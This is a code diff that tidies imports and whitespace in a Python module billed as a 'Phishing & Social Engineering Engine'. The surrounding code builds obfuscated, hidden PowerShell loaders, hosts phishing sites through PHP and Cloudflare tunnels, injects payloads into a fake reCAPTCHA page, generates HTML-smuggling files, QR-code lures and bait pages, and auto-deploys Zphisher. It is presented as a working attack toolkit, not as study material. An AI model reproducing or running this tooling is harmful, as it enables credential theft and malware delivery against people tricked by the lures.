@@ -1,14 +1,16 @@
 """ShadowCypher Phishing & Social Engineering Engine — Ported from ShadowPhish (Elite Bridge)."""
 
-import os
-import re
-import zlib
 import base64
+import os
 import random
+import re
 import string
 import subprocess
+import zlib
+
 from shadowcypher.core.logger import logger
 from shadowcypher.core.runner import runner
+
 
 class Phishing:
     """The 'Siren' engine. Handles artifact generation and phishing deployment."""
@@ -42,11 +44,11 @@ class Phishing:
                 compressed_b64 = base64.b64encode(compressed).decode("utf-8")
                 r1, r2, r3 = [''.join(random.choices(string.ascii_letters, k=8)) for _ in range(3)]
                 result = f'${r1} = "{compressed_b64}"; ${r2} = New-Object IO.MemoryStream(,[Convert]::FromBase64String(${r1})); ${r3} = New-Object IO.Compression.DeflateStream(${r2}, [IO.Compression.CompressionMode]::Decompress); $reader = New-Object IO.StreamReader(${r3}, [Text.Encoding]::UTF8); IEX ($reader.ReadToEnd())'
-            
+
             if use_b64:
                 encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                 result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"
-            
+
             path = f"payloads/obfuscated_{int(random.random()*1000)}.ps1"
             with open(path, "w") as f:
                 f.write(result)
@@ -60,18 +62,18 @@ class Phishing:
         site_path = os.path.join("shadowcypher/modules/phish_data/sites", template.lower())
         if not os.path.exists(site_path):
             site_path = "shadowcypher/modules/phish_data/fake-recaptcha"
-        
+
         logger.info("phish", f"Launching {template} server on port {port}")
         if on_output:
             on_output(f"[PHISH] ACTIVATING_INFRASTRUCTURE: {template} on port {port}\n")
-        
+
         # Start the local PHP backend
         cmd = ["php", "-S", f"127.0.0.1:{port}"]
         task_id = runner.execute_task(f"PHISH_{template}", cmd, callback=on_output, cwd=site_path)
-        
+
         if use_tunnel:
             Phishing.start_secure_tunnel(port, mode=tunnel_mode, on_output=on_output)
-            
+
         return task_id
 
     @staticmethod
@@ -80,7 +82,7 @@ class Phishing:
         logger.info("phish", f"ENGAGING_SECURE_TUNNEL: {mode} (port {port})")
         if on_output:
             on_output(f"[STEALTH] INITIATING_HTTPS_TUNNEL: {mode.upper()}...\n")
-            
+
         if mode == "cloudflare":
             # Cloudflared provides free, automated SSL
             cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"]
@@ -102,21 +104,21 @@ class Phishing:
         """Generate a fake reCAPTCHA artifact with custom payload and OS detection."""
         base_path = "shadowcypher/modules/phish_data/fake-recaptcha"
         js_path = os.path.join(base_path, "src", "fakerecaptcha.js")
-        
+
         if not os.path.exists(js_path):
             return "ERROR: reCAPTCHA assets missing."
-        
+
         try:
             with open(js_path, "r") as f:
                 js_content = f.read()
-            
+
             # Inject payload into the JS
             payload_escaped = payload.replace('"', '\\"')
             new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload_escaped}`;', js_content, flags=re.DOTALL)
-            
+
             with open(js_path, "w") as f:
                 f.write(new_js)
-            
+
             return f"SUCCESS: Fake reCAPTCHA configured for {target_os} with custom payload."
         except Exception as e:
             return f"ERROR: reCAPTCHA config failed: {e}"
@@ -126,11 +128,11 @@ class Phishing:
         """Generate an HTML smuggling file embedding the target file."""
         if not os.path.exists(file_path):
             return "ERROR: Source file not found."
-        
+
         try:
             with open(file_path, "rb") as f:
                 blob = base64.b64encode(f.read()).decode()
-            
+
             html = f'''
             <html>
                 <body>
@@ -160,7 +162,7 @@ class Phishing:
         """Autonomous Zphisher deployment for multi-platform social engineering."""
         project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
         zp_path = os.path.join(project_root, "tools", "zphisher")
-        
+
         if not os.path.exists(zp_path):
             if on_output:
                 on_output("[SYSTEM] ZPHISHER_MISSING: Initiating secure acquisition...")
@@ -174,7 +176,7 @@ class Phishing:
                 if on_output:
                     on_output(f"[ERROR] ACQUISITION_FAILED: {e}\n")
                 return
-        
+
         # Zphisher is interactive, so we run it in a way that the user can interact via terminal support
         cmd = ["bash", os.path.join(zp_path, "zphisher.sh")]
         return runner.execute_task("ZPHISHER_DEPLOYMENT", cmd, callback=on_output)
@@ -216,20 +218,22 @@ class Phishing:
         """Generate a malicious QR Code for social engineering (Quishing)."""
         # Using a public API for zero-dependency high-fidelity QR codes
         # In a real environment, we'd bundle a local library, but this is portably elite.
-        encoded_url = base64.b64encode(url.encode()).decode()
+        base64.b64encode(url.encode()).decode()
         qr_api = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={url}"
-        
+
         path = f"payloads/qr_code_{int(random.random()*1000)}.html"
         os.makedirs("payloads", exist_ok=True)
         with open(path, "w") as f:
             f.write(f"<html><body><img src='{qr_api}'><br>Target: {url}</body></html>")
-        
+
         return f"SUCCESS: QR Payload generated at {path}"
 
     @staticmethod
     def generate_professional_bait(target_type, hook_url):
         """Generate a phishing lure HTML page for the given target type."""
-        import os, random, string
+        import os
+        import random
+        import string
         os.makedirs("payloads", exist_ok=True)
         slug = "".join(random.choices(string.ascii_lowercase, k=6))
         filename = f"payloads/lure_{target_type.replace(' ', '_')}_{slug}.html"
